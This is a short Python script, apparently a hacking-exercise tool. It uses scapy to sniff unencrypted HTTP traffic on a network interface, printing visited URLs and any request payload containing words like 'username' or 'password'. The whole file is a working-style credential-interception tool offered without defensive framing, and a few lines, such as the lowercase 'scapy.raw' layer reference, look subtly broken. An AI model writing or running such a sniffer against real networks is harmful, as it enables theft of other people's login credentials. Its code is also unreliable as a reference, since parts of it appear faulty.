#!/usr/bin/env python3


import scapy.all as scapy
from scapy.layers import http # Import the HTTP layer from scapy

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80") # Sniff packets on the specified interface

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path # Get the URL from the HTTP request packet

def get_login_info(packet):
    if packet.haslayer(scapy.raw): 
        load = str(packet[scapy.raw].load) # Print the raw payload of the HTTP request
        keywords = ["username", "password", "login", "email"]
        for keyword in keywords:
            if keyword in load:
                return load
               

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet) # Get the URL from the packet
        print("[+] HTTP Request >> " + url.decode()) # Print the URL of the HTTP request
        
        login_info = get_login_info(packet) # Get the login information from the packet
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

# Start sniffing on the specified interface

sniff("eth0")

